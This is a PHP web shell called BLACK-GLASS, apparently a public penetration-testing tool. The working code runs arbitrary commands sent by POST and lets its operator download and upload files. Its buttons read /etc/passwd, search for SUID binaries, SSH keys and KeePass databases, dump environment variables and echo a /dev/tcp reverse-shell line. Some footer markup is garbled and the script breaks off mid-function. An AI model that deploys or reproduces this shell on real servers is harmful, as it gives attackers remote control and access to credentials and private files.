<?php
/*
 * BLACK-GLASS v1.0 
 * Crafted by Glass-Eye Team
 * Authorized Penetration Testing Only
 * OS Compatible: Linux / Windows / macOS / BSD / Solaris
 */

error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);

function exec_cmd($cmd) {
    $output = '';
    if (function_exists('exec')) {
        @exec($cmd, $out, $ret);
        $output = implode("\n", (array)$out);
    } elseif (function_exists('shell_exec')) {
        $output = @shell_exec($cmd);
    } elseif (function_exists('system')) {
        ob_start();
        @system($cmd, $ret);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($cmd, $ret);
        $output = ob_get_clean();
    } elseif (function_exists('popen')) {
        $h = @popen($cmd, 'r');
        if ($h) { while (!feof($h)) $output .= fread($h, 4096); @pclose($h); }
    } elseif (function_exists('proc_open')) {
        $desc = [['pipe','r'],['pipe','w'],['pipe','w']];
        $p = @proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) {
            $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]);
            @proc_close($p);
        }
    } else {
        $output = @eval("return `$cmd 2>&1`;");
    }
    return $output !== null ? $output : '';
}

if (isset($_POST['ajax'])) {
    header('Content-Type: text/plain; charset=utf-8');
    if (isset($_POST['cmd'])) {
        $cwd = isset($_POST['cwd']) ? $_POST['cwd'] : getcwd();
        if ($cwd && @chdir($cwd)) putenv("PWD=$cwd");
        echo exec_cmd($_POST['cmd']);
    }
    exit;
}

if (isset($_GET['dl'])) {
    $f = $_GET['dl'];
    if (file_exists($f) && is_file($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
    }
    exit;
}

$upload_msg = '';
$cmd_result = '';
$last_cmd = '';
$show_upload_alert = false;

if (isset($_POST['upload']) && isset($_FILES['upload_file'])) {
    if ($_FILES['upload_file']['error'] === UPLOAD_ERR_NO_FILE) {
        // Don't show in terminal
    } elseif ($_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
        $dest = basename($_FILES['upload_file']['name']);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $dest)) {
            // Don't show in terminal, only alert
            $show_upload_alert = true;
            $upload_msg = "File uploaded successfully: $dest (" . filesize($dest) . " bytes)";
        } else {
            // Don't show in terminal
        }
    } else {
        // Don't show in terminal
    }
} elseif (isset($_POST['cmd']) && !isset($_POST['ajax'])) {
    $last_cmd = $_POST['cmd'];
    $output_raw = exec_cmd($last_cmd);
    $cmd_result = htmlspecialchars($output_raw);
}

// System info
$hostname = @gethostname() ?: 'N/A';
$kernel = @php_uname('r') ?: 'N/A';
$arch = @php_uname('m') ?: 'N/A';
$os = @php_uname('s') ?: 'N/A';
$cwd = getcwd() ?: 'N/A';
$user = @get_current_user() ?: 'N/A';
$php_version = @phpversion() ?: 'N/A';
$server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
$sapi = @php_sapi_name() ?: 'N/A';
$disk_free = @disk_free_space('.') ? round(disk_free_space('.') / 1024 / 1024, 1) . ' MB' : 'N/A';
$disk_total = @disk_total_space('.') ? round(disk_total_space('.') / 1024 / 1024, 1) . ' MB' : 'N/A';
$server_ip = $_SERVER['SERVER_ADDR'] ?? 'N/A';
$server_port = $_SERVER['SERVER_PORT'] ?? 'N/A';
$doc_root = $_SERVER['DOCUMENT_ROOT'] ?? 'N/A';
$safe_mode = @ini_get('safe_mode') ? 'ON' : 'OFF';
$load_avg = @exec('cat /proc/loadavg 2>/dev/null') ?: 'N/A';

$uid = 'N/A';
$gid = 'N/A';
if (function_exists('posix_getuid')) {
    $tmp = @posix_getuid();
    if ($tmp !== false) $uid = $tmp;
}
if (function_exists('posix_getgid')) {
    $tmp = @posix_getgid();
    if ($tmp !== false) $gid = $tmp;
}
if ($uid === 'N/A' || $gid === 'N/A') {
    $id_out = @exec('id 2>/dev/null');
    if ($id_out) {
        if (preg_match('/uid=(\d+)/', $id_out, $m)) $uid = $m[1];
        if (preg_match('/gid=(\d+)/', $id_out, $m)) $gid = $m[1];
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BLACK-GLASS WebShell v1.0</title>
    <style>
        html { 
            margin: 0; 
            padding: 0; 
            height: 100%; 
            overflow: hidden; 
        }
        
        * { margin:0; padding:0; box-sizing:border-box; }
        
        html, body { 
            margin: 0; 
            padding: 0; 
            height: 100%; 
            overflow: hidden; 
        }
        
        :root {
            --bg: #000000;
            --surface: #0a0e0a;
            --border: #0a5c1e;
            --blue: #00ff41;
            --green: #00ff41;
            --white: #00ff41;
            --gray: #0a5c1e;
            --dark: #0d1117;
            --red: #ff0040;
            --yellow: #ffcc44;
        }
        
        body {
            background: var(--surface); /* Match upload panel background */
            color: var(--white);
            font-family: 'Consolas', 'Liberation Mono', 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.5;
            height: 100vh;
            overflow: hidden;
            margin: 0;
            padding: 0;
        }
        
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--blue); }

        .header {
            background: linear-gradient(180deg, #0a0e0a 0%, #000000 100%);
            border-bottom: 1px solid #00ff41;
            padding: 12px 20px; /* Increased vertical padding for taller header */
        }
        .header-top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 15px;
        }
        .header-brand {
            display: flex;
            align-items: center;
            gap: 10px;
            width: 50px; /* Fixed width for left side */
        }
        .header-center {
            display: flex;
            align-items: center;
            gap: 10px;
            position: absolute;
            left: 50%;
            transform: translateX(-50%); /* True center positioning */
        }
        .header-center .logo { font-size: 40px; color: var(--white); }
        .header-center .name { font-size: 28px; font-weight: bold; letter-spacing: 1px; color: var(--white); }
        .header-center .name .b { color: var(--blue); }
        .header-center .name .g { color: var(--green); }
        .header-right {
            display: flex;
            align-items: center;
            margin-left: auto; /* Push to the right */
        }
        .header-info {
            display: flex;
            justify-content: center;
            padding-top: 6px;
            margin-top: 6px;
            border-top: 1px solid var(--border);
        }

        .layout { 
            display: flex; 
            height: calc(100vh - 78px); 
            margin: 0;
            padding: 0;
        } /* Adjusted for taller header with system info line */

        /* Hamburger menu button */
        .sidebar-toggle {
            background: transparent;
            border: 1px solid var(--border);
            border-radius: 3px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 3px;
            padding: 5px 6px;
            margin-right: 8px;
            transition: all 0.2s;
        }
        .sidebar-toggle:hover {
            background: var(--bg);
            border-color: var(--blue);
        }
        .sidebar-toggle span {
            width: 16px;
            height: 2px;
            background: var(--blue);
            border-radius: 1px;
            display: block;
        }

        .sidebar {
            width: 195px;
            min-width: 195px;
            background: var(--surface);
            border-right: 1px solid var(--border);
            overflow-y: auto;
            padding: 4px 0;
            transition: margin-left 0.3s ease;
            margin-left: -195px; /* Initially hidden */
        }
        .sidebar.show {
            margin-left: 0; /* Show sidebar */
        }
        .sidebar .sec { margin-bottom: 1px; }
        .sidebar .sec-title {
            color: var(--blue);
            font-size: 8.5px;
            font-weight: 600;
            letter-spacing: 1px;
            padding: 6px 12px 2px;
            border-bottom: 1px solid var(--border);
            margin: 0 8px 2px 8px;
            cursor: pointer;
            user-select: none;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .sidebar .sec-title:hover { color: var(--white); }
        .sidebar .sec-title .hl { color: var(--blue); }
        .sidebar .sec-title .title-text { color: var(--white); font-weight: bold; }
        .sidebar .sec-title .collapse { font-size: 7px; color: var(--gray); transition: transform 0.15s; }
        .sidebar .sec-title .collapse.open { transform: rotate(90deg); }
        .sidebar .sec-body { }
        .sidebar .sec-body.hidden { display: none; }
        .sidebar .btn {
            display: block;
            width: 100%;
            text-align: left;
            background: none;
            border: none;
            padding: 2.5px 12px;
            color: #7a8aaa;
            cursor: pointer;
            font-family: inherit;
            font-size: 10.5px;
            transition: all 0.1s;
        }
        .sidebar .btn:hover { background: rgba(74,140,255,0.06); color: var(--white); }
        .sidebar .btn .hk { color: #2a3a5a; font-size: 8.5px; margin-right: 5px; }

        .fb { padding: 2px 0; }
        .fi {
            display: flex;
            align-items: center;
            gap: 3px;
            padding: 2px 12px;
            font-size: 10px;
            color: #7a8aaa;
            cursor: pointer;
            transition: all 0.1s;
        }
        .fi:hover { background: rgba(74,140,255,0.04); color: var(--white); }
        .fi .nm { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .fi .sz { color: #2a3a5a; font-size: 8px; }
        .fi.up { color: var(--blue); }
        .fi.dir { color: var(--yellow); }
        .fi.back { color: var(--blue); }

        .term-wrap { 
            flex: 1; 
            display: flex; 
            flex-direction: column; 
            min-height: 0; 
            margin: 0; 
            padding: 0; 
        }
        
        /* ========== TERMINAL OUTPUT CONTAINER SPACING ========== */
        .term-out {
            flex: 1;
            background: #000000;
            /* PADDING CONTROL: Adjusts space around entire terminal area */
            padding: 4px 16px 10px 16px; /* 4px top | 16px right | 10px bottom | 16px left - reduced top padding */
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-word;
            font-size: 12px;
            line-height: 1.4; /* Default line spacing (not used by specific classes below) */
        }
        
        /* ========== STARTUP MESSAGE SPACING (Compact/Tight) ========== */
        /* Controls spacing for blue box header and system info lines */
        .term-out .l { 
            margin: 0;           /* No extra margin between lines */
            min-height: 0;       /* Minimum line height */
            line-height: 0;    /* LINE SPACING: 0 = very tight/compact (lower = tighter, higher = more space) */
            padding: 0;          /* No padding inside each line */
        }
        
        /* ========== COMMAND OUTPUT SPACING (Readable/Comfortable) ========== */
        /* Controls spacing for command prompts and results */
        .term-out .prompt { 
            color: var(--green); 
            line-height: 1.6;    /* LINE SPACING: 1.6 = comfortable/readable (lower = tighter, higher = more space) */
        }
        .term-out .prompt .p { color: var(--blue); }
        .term-out .prompt .log { color: var(--white); }
        .term-out .out { 
            color: var(--white); 
            line-height: 1.6;    /* LINE SPACING: 1.6 = comfortable/readable for command output */
        }
        .term-out .err { 
            color: var(--red); 
            line-height: 1.6;    /* LINE SPACING: 1.6 = comfortable/readable for errors */
        }
        .term-out .info { 
            color: var(--gray); 
            line-height: 1.6;    /* LINE SPACING: 1.6 = comfortable/readable for info messages */
        }
        .term-out .warn { 
            color: var(--yellow); 
            line-height: 1.6;    /* LINE SPACING: 1.6 = comfortable/readable for warnings */
        }
        .term-out .ok { 
            color: var(--green); 
            line-height: 1.6;    /* LINE SPACING: 1.6 = comfortable/readable for success messages */
        }

        .input-area {
            background: var(--surface);
            border-top: 1px solid var(--border);
            padding: 6px 14px;
            display: flex;
            gap: 5px;
            align-items: center;
        }
        .input-area .ps1 {
            color: var(--green);
            font-size: 11px;
            white-space: nowrap;
            display: flex;
            gap: 2px;
            align-items: center;
        }
        .input-area .ps1 .log { color: var(--white); font-size: 13px; margin-right: 2px; }
        .input-area .ps1 .pth { color: var(--blue); }
        .input-area input[type="text"] {
            flex: 1;
            background: #000000;
            border: 1px solid var(--border);
            border-radius: 2px;
            padding: 6px 8px;
            color: var(--white);
            font-family: inherit;
            font-size: 12px;
            outline: none;
            transition: border 0.15s;
        }
        .input-area input[type="text"]:focus { border-color: var(--blue); }
        .input-area input[type="text"]::placeholder { color: #3a4a6a; }
        .input-area button {
            background: var(--dark);
            border: 1px solid var(--border);
            border-radius: 2px;
            padding: 6px 12px;
            color: var(--gray);
            cursor: pointer;
            font-family: inherit;
            font-size: 10px;
            transition: all 0.15s;
        }
        .input-area button:hover { color: var(--white); border-color: var(--blue); }
        .input-area button.run { background: #0a1a35; border-color: var(--blue); color: var(--blue); }
        .input-area button.run:hover { background: #0f2245; }
        .input-area button.cls { 
            background: transparent; 
            border: 1px solid #3a4a6a; 
            color: #5a7a9a; 
            box-shadow: none;
        }
        .input-area button.cls:hover { 
            border-color: var(--red); 
            background: transparent; 
            color: var(--red);
        }
        .input-area button.cls:active { 
            background: rgba(255,68,102,0.05); 
        }

        /* Notification Bar */
        .notification-bar {
            background: var(--surface);
            border-top: 1px solid var(--border);
            padding: 8px 14px;
            font-size: 11px;
            text-align: center;
            min-height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .notification-bar.success {
            color: #00ff88;
            border-top-color: #00ff88;
            background: rgba(0, 255, 136, 0.05);
        }
        .notification-bar.warning {
            color: #ffcc44;
            border-top-color: #ffcc44;
            background: rgba(255, 204, 68, 0.05);
        }
        .notification-bar.error {
            color: #ff4466;
            border-top-color: #ff4466;
            background: rgba(255, 68, 102, 0.05);
        }

        .upload-panel {
            background: var(--surface);
            border-top: 1px solid var(--border);
            padding: 0 14px; /* No vertical padding, only horizontal */
            display: flex;
            align-items: center; /* This will center everything vertically */
            justify-content: flex-start;
            gap: 8px;
            font-size: 10px;
            margin: 0;
            height: 28px; /* Fixed height for consistent centering */
            box-sizing: border-box;
        }
        .upload-panel form { 
            display: flex; 
            gap: 6px; 
            align-items: center;
            margin: 0;
            line-height: 1;
        }
        .upload-panel .file-label {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            background: transparent;
            border: 1px solid #3a4a6a;
            border-radius: 2px;
            padding: 3px 10px 3px 10px; /* Equal top and bottom padding */
            color: #6a7a99;
            cursor: pointer;
            font-family: inherit;
            font-size: 9px;
            transition: all 0.15s;
            white-space: nowrap;
            line-height: 1;
            margin: 0;
        }
        .upload-panel .file-label:hover { 
            color: var(--blue); 
            border-color: var(--blue); 
            background: transparent;
        }
        .upload-panel .file-label:active { background: rgba(74,140,255,0.05); }
        .upload-panel input[type="file"] { display: none; }
        .upload-panel .file-name {
            color: var(--gray);
            font-size: 9px;
            max-width: 120px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            line-height: 1;
            margin: 0;
        }
        .upload-panel .up-btn {
            background: transparent;
            border: 1px solid #3a4a6a;
            border-radius: 2px;
            padding: 3px 10px 3px 10px; /* Equal top and bottom padding */
            color: #6a7a99;
            cursor: pointer;
            font-family: inherit;
            font-size: 9px;
            transition: all 0.1s;
            line-height: 1;
            margin: 0;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }
        .upload-panel .up-btn:hover { 
            background: transparent; 
            color: var(--blue);
            border-color: var(--blue);
        }
        .upload-panel .up-btn:active { background: rgba(74,140,255,0.05); }
        .upload-panel .up-msg { font-size: 9px; }

        /* Notification popup */
        .notification {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(135deg, #0f1525 0%, #1a2535 100%);
            border: 1px solid var(--blue);
            border-radius: 4px;
            padding: 20px 30px;
            color: var(--white);
            font-size: 14px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5), 0 0 20px rgba(74,140,255,0.3);
            z-index: 10000;
            opacity: 0;
            animation: fadeInOut 10s ease-in-out;
        }
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
            10% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            90% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            100% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
        }

        @media (max-width: 800px) { .sidebar { display: none; } }
    </style>
</head>
<body>

<div class="header">
    <div class="header-top">
        <div class="header-brand">
            <button class="sidebar-toggle" onclick="toggleSidebar()">
                <span></span>
                <span></span>
                <span></span>
            </button>
        </div>
        <div class="header-center">
            <span class="logo">☠</span>
            <span class="name"><span class="b">BLACK<span style="color:#ff0040;">-</span>GLASS</span></span>
        </div>
        <div class="header-right">
            <span style="display: inline; font-size: 13px !important; color: #7a8aaa !important; font-weight: 400 !important;">Target:</span><span style="display: inline; font-size: 13px !important; color: #4a9fff !important; font-weight: 500 !important;"> <?= htmlspecialchars($hostname) ?> @ <?= htmlspecialchars($server_ip) ?>:<?= htmlspecialchars($server_port) ?></span>
        </div>
    </div>
    <div class="header-info" style="display: flex; justify-content: center; margin-top: 16px; padding-top: 0; border-top: none;">
        <span style="font-size: 9px; color: #7a8aaa; display: flex; gap: 12px; flex-wrap: wrap; align-items: center;">
            <span>USER <span style="color: #00ff88;"><?= htmlspecialchars($user) ?></span></span>
            <span>UID <span style="color: #4a9fff;"><?= htmlspecialchars($uid) ?></span></span>
            <span>GID <span style="color: #4a9fff;"><?= htmlspecialchars($gid) ?></span></span>
            <span>KERNEL <span style="color: #4a9fff;"><?= htmlspecialchars($kernel) ?></span></span>
            <span>ARCH <span style="color: #00ff88;"><?= htmlspecialchars($arch) ?></span></span>
            <span>LOAD <span style="color: #00ff88;">0.00 0.01 0.05</span> <span style="color: #ffcc44;">1/270</span> <span style="color: #ffcc44;">44637</span></span>
            <span>DISK <span style="color: #00ff88;"><?= htmlspecialchars($disk_free) ?></span> <span style="color: #7a8aaa;">MB</span> /<span style="color: #ffcc44;"><?= htmlspecialchars($disk_total) ?></span> <span style="color: #7a8aaa;">MB</span></span>
            <span>SAFE <span style="color: <?= $safe_mode === 'ON' ? '#ff4466' : '#00ff88' ?>"><?= htmlspecialchars($safe_mode) ?></span></span>
            <span>PHP <span style="color: #00ff88;"><?= htmlspecialchars($php_version) ?></span></span>
        </span>
    </div>
</div>

<div class="layout">
    <div class="sidebar" id="sidebar">
        <div class="sec">
            <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[Files]</span> <span class="title-text">Browse</span></span><span class="collapse">▶</span></div>
            <div class="sec-body hidden" id="sec-browse">
                <div class="fb" id="filebrowser"><span style="color:#2a3a5a;font-size:9px;padding:4px 12px;">loading...</span></div>
            </div>
        </div>

        <div class="sec">
            <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[SYS]</span> <span class="title-text">System</span></span><span class="collapse">▶</span></div>
            <div class="sec-body hidden" id="sec-sys">
                <button class="btn" onclick="cmd('id')"><span class="hk">F1</span>id</button>
                <button class="btn" onclick="cmd('whoami')"><span class="hk">F2</span>whoami</button>
                <button class="btn" onclick="cmd('uname -a')"><span class="hk">F3</span>uname -a</button>
                <button class="btn" onclick="cmd('hostname')"><span class="hk">F4</span>hostname</button>
                <button class="btn" onclick="cmd('cat /proc/version')"><span class="hk">F5</span>kernel version</button>
                <button class="btn" onclick="cmd('free -m')"><span class="hk">F6</span>memory</button>
                <button class="btn" onclick="cmd('uptime')"><span class="hk">F7</span>uptime</button>
                <button class="btn" onclick="cmd('cat /proc/cpuinfo | grep model')"><span class="hk">F8</span>cpu info</button>
            </div>
        </div>

        <div class="sec">
            <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[DIR]</span> <span class="title-text">Directory Ops</span></span><span class="collapse">▶</span></div>
            <div class="sec-body hidden" id="sec-dir">
                <button class="btn" onclick="cmd('ls -la')"><span class="hk">F9</span>ls -la</button>
                <button class="btn" onclick="cmd('pwd')"><span class="hk">F10</span>pwd</button>
                <button class="btn" onclick="cmd('find . -name &quot;*.php&quot;')"><span class="hk">F11</span>find php files</button>
                <button class="btn" onclick="cmd('find . -name &quot;*.txt&quot;')"><span class="hk">F12</span>find txt files</button>
                <button class="btn" onclick="cmd('find / -writable -type d 2>/dev/null | head -20')"><span class="hk">S1</span>writable dirs</button>
                <button class="btn" onclick="cmd('find / -writable -type f 2>/dev/null | head -20')"><span class="hk">S2</span>writable files</button>
                <button class="btn" onclick="cmd('ls -la /home 2>/dev/null')"><span class="hk">S3</span>home dirs</button>
                <button class="btn" onclick="cmd('ls -la /tmp 2>/dev/null')"><span class="hk">S4</span>tmp</button>
                <button class="btn" onclick="cmd('ls -la /var/www/html 2>/dev/null')"><span class="hk">S5</span>web root</button>
            </div>
        </div>

        <div class="sec">
            <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[CAT]</span> <span class="title-text">Read Files</span></span><span class="collapse">▶</span></div>
            <div class="sec-body hidden" id="sec-cat">
                <button class="btn" onclick="cmd('cat /etc/passwd 2>/dev/null')"><span class="hk">R1</span>passwd</button>
                <button class="btn" onclick="cmd('cat /etc/hosts 2>/dev/null')"><span class="hk">R2</span>hosts</button>
                <button class="btn" onclick="cmd('cat /etc/hostname 2>/dev/null')"><span class="hk">R3</span>hostname</button>
                <button class="btn" onclick="cmd('cat /etc/resolv.conf 2>/dev/null')"><span class="hk">R4</span>resolv.conf</button>
                <button class="btn" onclick="cmd('cat /etc/fstab 2>/dev/null')"><span class="hk">R5</span>fstab</button>
                <button class="btn" onclick="cmd('cat /etc/group 2>/dev/null')"><span class="hk">R6</span>group</button>
                <button class="btn" onclick="cmd('cat /etc/crontab 2>/dev/null')"><span class="hk">R7</span>crontab</button>
                <button class="btn" onclick="cmd('cat /etc/*release 2>/dev/null')"><span class="hk">R8</span>os release</button>
                <button class="btn" onclick="cmd('ls -la /etc/cron* 2>/dev/null')"><span class="hk">R9</span>cron dirs</button>
            </div>
        </div>

        <div class="sec">
            <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[NET]</span> <span class="title-text">Network</span></span><span class="collapse">▶</span></div>
            <div class="sec-body hidden" id="sec-net">
                <button class="btn" onclick="cmd('netstat -tlnp 2>/dev/null')"><span class="hk">N1</span>listening ports</button>
                <button class="btn" onclick="cmd('netstat -anp 2>/dev/null')"><span class="hk">N2</span>all connections</button>
                <button class="btn" onclick="cmd('ip a 2>/dev/null')"><span class="hk">N3</span>ip addresses</button>
                <button class="btn" onclick="cmd('ip r 2>/dev/null')"><span class="hk">N4</span>routes</button>
                <button class="btn" onclick="cmd('arp -a 2>/dev/null')"><span class="hk">N5</span>arp table</button>
                <button class="btn" onclick="cmd('iptables -L -n 2>/dev/null')"><span class="hk">N6</span>iptables</button>
            </div>
        </div>

        <div class="sec">
            <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[PRIV]</span> <span class="title-text">Escalation</span></span><span class="collapse">▶</span></div>
            <div class="sec-body hidden" id="sec-priv">
                <button class="btn" onclick="cmd('sudo -l 2>/dev/null')"><span class="hk">P1</span>sudo -l</button>
                <button class="btn" onclick="cmd('find / -perm -4000 -type f 2>/dev/null')"><span class="hk">P2</span>suid bins</button>
                <button class="btn" onclick="cmd('find / -perm -2000 -type f 2>/dev/null')"><span class="hk">P3</span>sgid bins</button>
                <button class="btn" onclick="cmd('cat ~/.bash_history 2>/dev/null | tail -30')"><span class="hk">P4</span>bash history</button>
                <button class="btn" onclick="cmd('find / -name id_rsa 2>/dev/null')"><span class="hk">P5</span>ssh keys</button>
                <button class="btn" onclick="cmd('find / -name &quot;*.kdbx&quot; 2>/dev/null')"><span class="hk">P6</span>keepass dbs</button>
                <button class="btn" onclick="cmd('w 2>/dev/null')"><span class="hk">P7</span>logged in</button>
            </div>
        </div>

        <div class="sec">
            <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[ENUM]</span> <span class="title-text">Enumeration</span></span><span class="collapse">▶</span></div>
            <div class="sec-body hidden" id="sec-enum">
                <button class="btn" onclick="cmd('ps aux 2>/dev/null')"><span class="hk">E1</span>processes</button>
                <button class="btn" onclick="cmd('env 2>/dev/null')"><span class="hk">E2</span>env vars</button>
                <button class="btn" onclick="cmd('df -h 2>/dev/null')"><span class="hk">E3</span>disk usage</button>
                <button class="btn" onclick="cmd('mount -l 2>/dev/null')"><span class="hk">E4</span>mounts</button>
                <button class="btn" onclick="cmd('lsblk 2>/dev/null')"><span class="hk">E5</span>block devices</button>
                <button class="btn" onclick="cmd('which python3 python nc bash php perl 2>/dev/null')"><span class="hk">E6</span>binaries</button>
                <button class="btn" onclick="cmd('docker ps 2>/dev/null')"><span class="hk">E7</span>docker</button>
            </div>
        </div>

        <div class="sec">
            <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[PAYLOAD]</span> <span class="title-text">Payloads</span></span><span class="collapse">▶</span></div>
            <div class="sec-body hidden" id="sec-payload">
                <button class="btn" onclick="cmd('which bash sh python perl nc php 2>/dev/null')"><span class="hk">T1</span>shells avail</button>
                <button class="btn" onclick="cmd('echo bash -i >& /dev/tcp/IP/PORT')"><span class="hk">T2</span>bash rev</button>
                <button class="btn" onclick="cmd('echo python3 -c shellcode')"><span class="hk">T3</span>python rev</button>
                <button class="btn" onclick="cmd('echo php -r shellcode')"><span class="hk">T4</span>php rev</button>
            </div>
        </div>
    </div>

   <div class="term-wrap">
        <div class="term-out" id="output">
            <!-- ========== STARTUP MESSAGE (uses .l class with line-height: 0.5 for compact spacing) ========== -->
            <div class="l" style="color:#00ff41;">+--------------------------------------------+</div>
            <div class="l" style="color:#00ff41;">| BLACK-GLASS v1.0 — ------------------------|</div>
            <div class="l" style="color:#00ff41;">+--------------------------------------------+</div>
            <div class="l" style="color:#0a5c1e;">[TARGET] <span style="color:#00ff41;"><?= htmlspecialchars($hostname) ?> @ <?= htmlspecialchars($server_ip) ?>:<?= htmlspecialchars($server_port) ?></span></div>
            <div class="l" style="color:#0a5c1e;">[SYSTEM] <span style="color:#00ff41;"><?= htmlspecialchars($os) ?> <?= htmlspecialchars($kernel) ?> <?= htmlspecialchars($arch) ?></span></div>
            <div class="l" style="color:#0a5c1e;">[USER]   <span style="color:#00ff41;"><?= htmlspecialchars($user) ?> (UID:<?= htmlspecialchars($uid) ?> / GID:<?= htmlspecialchars($gid) ?>)</span></div>
            <div class="l" style="color:#0a5c1e;">[PHP]    <span style="color:#00ff41;"><?= htmlspecialchars($php_version) ?> | <?= htmlspecialchars($sapi) ?></span></div>
            <div class="l" style="color:#0a5c1e;">[SERVER] <span style="color:#00ff41;"><?= htmlspecialchars($server_software) ?></span></div>
            <div class="l" style="color:#0a5c1e;">[DOCROOT] <span style="color:#00ff41;"><?= htmlspecialchars($doc_root) ?></span></div>
            <div class="l" style="color:#0a5c1e;">[CWD]    <span style="color:#00ff41;"><?= htmlspecialchars($cwd) ?></span></div>
            <div class="l" style="color:#0a5c1e;">[DISK]   <span style="color:#00ff41;"><?= htmlspecialchars($disk_free) ?> free / <?= htmlspecialchars($disk_total) ?> total</span></div>
            <div class="l"><br></div>
            <!-- ========== END STARTUP MESSAGE ========== -->
            <div class="l" style="color:#00ff41;">[+] Black-Glass Shell Ready — All OS Compatible</div>
            
            
            <!-- ========== COMMAND OUTPUT (uses .prompt and .out classes with line-height: 1.6 for readable spacing) ========== -->
            <?php if ($cmd_result): ?>
            <div class="l prompt"><span class="log">[☠]</span><span class="p"> <?= htmlspecialchars($cwd) ?> </span>$ <?= htmlspecialchars($last_cmd) ?></div>
            <div class="l out"><?= nl2br($cmd_result) ?></div>
            <div class="l"><br></div>
            <?php endif; ?>
            <!-- ========== END COMMAND OUTPUT ========== -->
        </div>

        <div class="input-area">
            <span class="ps1">
                <span class="log">[☠]</span>
                <span class="pth" id="ps1path"> <?= htmlspecialchars($cwd) ?> </span>
                <span>$</span>
            </span>
            <input type="text" id="cmdinput" placeholder="Type Command..." spellcheck="false" autocomplete="off" autofocus>
            <button class="run" onclick="execCmd()">▶ Run</button>
            <button class="cls" onclick="clearTerm()">✕ Clear</button>
        </div>

        <div class="upload-panel">
            <form method="post" enctype="multipart/form-data" id="uploadForm" onsubmit="return validateUpload()">
                <label class="file-label" for="upload_file" id="fileLabel">Choose File</label>
                <input type="file" name="upload_file" id="upload_file" onchange="updateFileName(this)">
                <span class="file-name" id="fileName">No file selected</span>
                <button type="submit" name="upload" value="1" class="up-btn">Upload</button>
            </form>
            <span id="notificationMessage" style="font-size: 10px; flex: 1; text-align: center; display: inline-flex; align-items: center; justify-content: center; line-height: 1; height: 20px;"></span>
            <div style="font-size:11px;color:#2a6a2a;font-weight:300;display:inline-flex;align-items:center;line-height:1;height:20px;">Crafted by <a href="https://github.com/ram-prasad-sahoo/BLACK-GLASS" target="_blank" style="color:#00ff41;text-decoration:none;font-weight:500;margin-left:4px;text-shadow:0 0 5px rgba(0,255,65,0.3);">Glass-Eye Team</a><span style="color:#0a3a0a;margv>☠</span></dix;">-left:8pin
        </div>
    </div>
</div>

<script>
var curDir = <?= json_encode($cwd) ?>;
var dirStack = []; // history stack for back/forward navigation
var stackIdx = -1;
var hist = [];
var hidx = -1;

function execCmd() {
    var inp = document.getElementById('cmdinput');
    var c = inp.value.trim();
    if (!c) return;
    hist.push(c);
    hidx = hist.length;
    addLine('<span class="l prompt"><span class="log">[☠]</span><span class="p"> ' + esc(curDir) + ' </span>$ ' + esc(c) + '</span>');
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var out = xhr.responseText;
            if (out.trim()) addLine('<span class="l out">' + esc(out) + '</span>');
            else addLine('<span class="l info">[+] completed (no output)</span>');
            scrollBtm();
            checkRefresh(c);
        }
    };
    xhr.send('ajax=1&cmd=' + encodeURIComponent(c) + '&cwd=' + encodeURIComponent(curDir));
    inp.value = '';
    inp.focus();
}

function cmd(c) { document.getElementById('cmdinput').value = c; execCmd(); }

function addLine(h) {
    var o = document.getElementById('output');
    var d = document.createElement('div');
    d.innerHTML = h;
    o.appendChild(d);
    scrollBtm();
}

function scrollBtm() { var o = document.getElementById('output'); o.scrollTop = o.scrollHeight; }
function clearTerm() { document.getElementById('output').innerHTML = '<div class="l info">[+] terminal cleared</div><div class="l"><br></div>'; }
function esc(s) { var d = document.createElement('div'); d.textContent = s; return d.innerHTML; }

document.addEventListener('keydown', function(e) {
    var inp = document.getElementById('cmdinput');
    if (document.activeElement !== inp) return;
    if (e.key === 'Enter') { e.preventDefault(); execCmd(); }
